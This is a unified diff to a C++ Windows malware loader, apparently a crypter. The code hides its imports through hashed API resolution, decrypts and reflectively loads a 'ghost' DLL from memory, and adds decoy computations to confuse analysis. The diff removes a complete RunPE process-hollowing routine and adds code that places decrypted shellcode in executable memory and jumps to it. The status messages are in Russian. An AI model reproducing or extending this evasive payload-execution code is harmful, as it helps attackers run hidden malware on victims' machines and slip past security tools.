@@ -169,17 +169,11 @@ constexpr DWORD hashGetProcAddr = KCLHashStringDJB2("GetProcAddress");
 constexpr DWORD hashGetTempPathA = KCLHashStringDJB2("GetTempPathA");
 constexpr DWORD hashCreateFileA = KCLHashStringDJB2("CreateFileA");
 constexpr DWORD hashWriteFile = KCLHashStringDJB2("WriteFile");
-constexpr DWORD hashCloseHandle = KCLHashStringDJB2("CloseHandle");
-constexpr DWORD hashCreateProcessA = KCLHashStringDJB2("CreateProcessA");
-constexpr DWORD hashWaitForSingleObject = KCLHashStringDJB2("WaitForSingleObject");
 constexpr DWORD hashDeleteFileA = KCLHashStringDJB2("DeleteFileA");
+constexpr DWORD hashGetSystemInfo = KCLHashStringDJB2("GetSystemInfo");
 constexpr DWORD hashGetModuleFileNameA = KCLHashStringDJB2("GetModuleFileNameA");
 constexpr DWORD hashSetConsoleTitleA = KCLHashStringDJB2("SetConsoleTitleA");
-constexpr DWORD hashNtUnmap = KCLHashStringDJB2("NtUnmapViewOfSection");
-constexpr DWORD hashVirtualAllocEx = KCLHashStringDJB2("VirtualAllocEx");
 constexpr DWORD hashGetEnvironmentVariableA = KCLHashStringDJB2("GetEnvironmentVariableA");
-constexpr DWORD hashReadProcessMemory = KCLHashStringDJB2("ReadProcessMemory");
-constexpr DWORD hashWriteProcessMemory = KCLHashStringDJB2("WriteProcessMemory");
 
 typedef LPVOID(WINAPI *KCLVirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL(WINAPI* KCLVirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
@@ -188,17 +182,10 @@ typedef FARPROC(WINAPI* KCLGetProcAddressFunc)(HMODULE, LPCSTR);
 typedef DWORD(WINAPI* KCLGetTempPathAFunc)(DWORD, LPSTR);
 typedef HANDLE(WINAPI* KCLCreateFileAFunc)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 typedef BOOL(WINAPI* KCLWriteFileFunc)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
-typedef BOOL(WINAPI* KCLCloseHandleFunc)(HANDLE);
-typedef BOOL(WINAPI* KCLCreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
-typedef DWORD(WINAPI* KCLWaitForSingleObjectFunc)(HANDLE, DWORD);
-typedef BOOL(WINAPI* KCLDeleteFileAFunc)(LPCSTR);
+typedef void(WINAPI* KCLGetSystemInfoFunc)(LPSYSTEM_INFO);
 typedef DWORD(WINAPI* KCLGetModuleFileNameAFunc)(HMODULE, LPSTR, DWORD);
 typedef BOOL(WINAPI* KCLSetConsoleTitleAFunc)(LPCSTR);
-typedef NTSTATUS(WINAPI* KCLNtUnmapViewOfSectionFunc)(HANDLE, PVOID);
-typedef LPVOID(WINAPI* KCLVirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef DWORD(WINAPI* KCLGetEnvironmentVariableAFunc)(LPCSTR, LPSTR, DWORD);
-typedef BOOL (WINAPI* KCLReadProcessMemoryFunc)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
-typedef BOOL (WINAPI* KCLWriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
 
 bool LoadGhostDllFromMemory(const std::vector<UCHAR>& dllBytes) {
     if (dllBytes.empty()) return false;
@@ -328,87 +315,39 @@ bool LoadGhostDllFromMemory(const std::vector<UCHAR>& dllBytes) {
     return true;
 }
 
-bool RunPE_x64(const std::vector<UCHAR>& payloadBytes, const std::string& targetProcess) {
-    if (payloadBytes.size() < sizeof(IMAGE_DOS_HEADER)) { return false; }
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payloadBytes.data();
-    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) { return false; }
-    if (pDos->e_lfanew <= 0 || pDos->e_lfanew >= (payloadBytes.size() - sizeof(IMAGE_NT_HEADERS))) { return false; }
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(payloadBytes.data() + pDos->e_lfanew);
-    if (pNt->Signature != IMAGE_NT_SIGNATURE) { return false; }
+bool ExecutePayload(const std::vector<UCHAR>& fileData, const size_t(&key)[5]) {
+    if (fileData.empty()) return false;
+    size_t keySize = sizeof(key);
+    SYSTEM_INFO sysInfo;
+    KCLGetSystemInfoFunc KCLGetSystemInfo = (KCLGetSystemInfoFunc)GetFuncFromModule(hashKernel32, hashGetSystemInfo);
+    KCLGetSystemInfo(&sysInfo);
+    size_t pageSize = sysInfo.dwPageSize;
+    size_t codeAlignedSize = ((fileData.size() + pageSize - 1) / pageSize) * pageSize;
+    size_t totalMemorySize = codeAlignedSize + keySize;
 
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
+    KCLVirtualAllocFunc KCLVirtualAlloc = (KCLVirtualAllocFunc)GetFuncFromModule(hashKernel32, hashVirtualAlloc);
+    KCLVirtualProtectFunc KCLVirtualProtect = (KCLVirtualProtectFunc)GetFuncFromModule(hashKernel32, hashVirtualProtect);
+    void* baseMemory = KCLVirtualAlloc(nullptr, totalMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!baseMemory) return false;
 
-    KCLCreateProcessAFunc KCLCreateProcessA = (KCLCreateProcessAFunc)GetFuncFromModule(hashKernel32, hashCreateProcessA);
-    if (!KCLCreateProcessA) { return false; }
+    UCHAR* codePtr = static_cast<UCHAR*>(baseMemory);
+    UCHAR* keyPtr = codePtr + codeAlignedSize;
 
-    if (!KCLCreateProcessA(targetProcess.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        return false;
-    }
+    memcpy(codePtr, fileData.data(), fileData.size());
+    memcpy(keyPtr, key, keySize);
 
-    CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(pi.hThread, &ctx)) { return false; }
+    DWORD oldProtect;
+    if (!KCLVirtualProtect(codePtr, codeAlignedSize, PAGE_EXECUTE_READWRITE, &oldProtect)) return false;
+    using EntryPointFunc = void(*)(void*);
+    EntryPointFunc entry = reinterpret_cast<EntryPointFunc>(codePtr);
 
-    PVOID imageBase = nullptr;
-    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(PVOID), NULL);
+    std::cout << "[+] Код загружен по адресу: " << (void*)codePtr << std::endl;
+    std::cout << "[+] Ключ лежит по адресу: " << (void*)keyPtr << std::endl;
+    std::cout << "[+] Прыжок в payload..." << std::endl;
 
-    KCLNtUnmapViewOfSectionFunc NtUnmapViewOfSection = (KCLNtUnmapViewOfSectionFunc)GetFuncFromModule(hashNtdll, hashNtUnmap);
-    if (NtUnmapViewOfSection && imageBase) {
-        NtUnmapViewOfSection(pi.hProcess, imageBase);
-    }
+    entry(keyPtr);
 
-    KCLVirtualAllocExFunc KCLVirtualAllocEx = (KCLVirtualAllocExFunc)GetFuncFromModule(hashKernel32, hashVirtualAllocEx);
-    if (!KCLVirtualAllocEx) { return false; }
-
-    PVOID pAlloc = KCLVirtualAllocEx(pi.hProcess, (PVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    if (!pAlloc) {
-        pAlloc = KCLVirtualAllocEx(pi.hProcess, NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (!pAlloc) {
-            TerminateProcess(pi.hProcess, 0);
-            return false;
-        }
-    }
-
-    if (!WriteProcessMemory(pi.hProcess, pAlloc, payloadBytes.data(), pNt->OptionalHeader.SizeOfHeaders, NULL)) { return false; }
-
-    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
-    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)pAlloc + pSec[i].VirtualAddress),
-            payloadBytes.data() + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, NULL);
-    }
-
-    DWORD64 delta = (DWORD64)pAlloc - pNt->OptionalHeader.ImageBase;
-    if (delta != 0) {
-        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-        if (relocDir.Size && relocDir.VirtualAddress) {
-            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(payloadBytes.data() + relocDir.VirtualAddress);
-            while (pReloc->VirtualAddress) {
-                PWORD pFixup = (PWORD)(pReloc + 1);
-                int count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-                for (int i = 0; i < count; i++, pFixup++) {
-                    if (*pFixup >> 12 == IMAGE_REL_BASED_DIR64) {
-                        DWORD64 patchAddr;
-                        ReadProcessMemory(pi.hProcess, (PVOID)((DWORD64)pAlloc + pReloc->VirtualAddress + (*pFixup & 0xFFF)), &patchAddr, sizeof(DWORD64), NULL);
-                        patchAddr += delta;
-                        WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)pAlloc + pReloc->VirtualAddress + (*pFixup & 0xFFF)), &patchAddr, sizeof(DWORD64), NULL);
-                    }
-                }
-                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
-            }
-        }
-    }
-
-    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pAlloc, sizeof(PVOID), NULL);
-    ctx.Rcx = (DWORD64)pAlloc + pNt->OptionalHeader.AddressOfEntryPoint;
-
-    if (!SetThreadContext(pi.hThread, &ctx)) { return false; }
-
-    if (ResumeThread(pi.hThread) == (DWORD)-1) { return false; }
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    std::cout << "[+] Выполнение завершено." << std::endl;
 
     return true;
 }
@@ -446,7 +385,7 @@ int main(int argc, char* argv[]) {
         std::cin.get(); return 1;
     }
 
-    IndependentDecrypt(encDllData, 0x7F);
+    IndependentDecrypt(encDllData, 0x70);
 
     if (!LoadGhostDllFromMemory(encDllData)) {
         std::cout << _X("[!] Fatal Error: memory.\n");
@@ -499,11 +438,20 @@ int main(int argc, char* argv[]) {
     volatile PVOID fake3 = GetFuncFromModule(hashKernel32, hashDeleteFileA);
     volatile PVOID fake4 = GetFuncFromModule(hashKernel32, hashGetTempPathA);
 
+
     if (fake1 && fake2 && fake3 && fake4) {
-        size_t x = 0xF0F0F0F0^(size_t)fake1;
+        size_t x = 0xF0F0F0F0 ^ (size_t)fake1;
         for (short i = 0; i < (short)((size_t)fake2 & 0x1FF); i++) x += (size_t)fake3 ^ (size_t)fake4;
         if (x % 7 > 3) x >>= 3;
-        if (!RunPE_x64(decryptedData, myPath)) {
+
+        size_t key[5];
+        key[0] = seed;
+        key[1] = (hashCreateFileA << 32) | hashGetTempPathA;
+        key[2] = (hashGetTempPathA << 32) | hashDeleteFileA;
+        key[3] = (hashDeleteFileA << 32) | hashWriteFile;
+        key[4] = (hashWriteFile << 32) | hashCreateFileA;
+
+        if (!ExecutePayload(decryptedData, key)) {
             std::cout << _X("[!] Fatal Error: execution (code: 0x") << std::hex << std::uppercase << std::setw(8) << x << _X(")\n");
             std::cin.get(); return 1;
         }
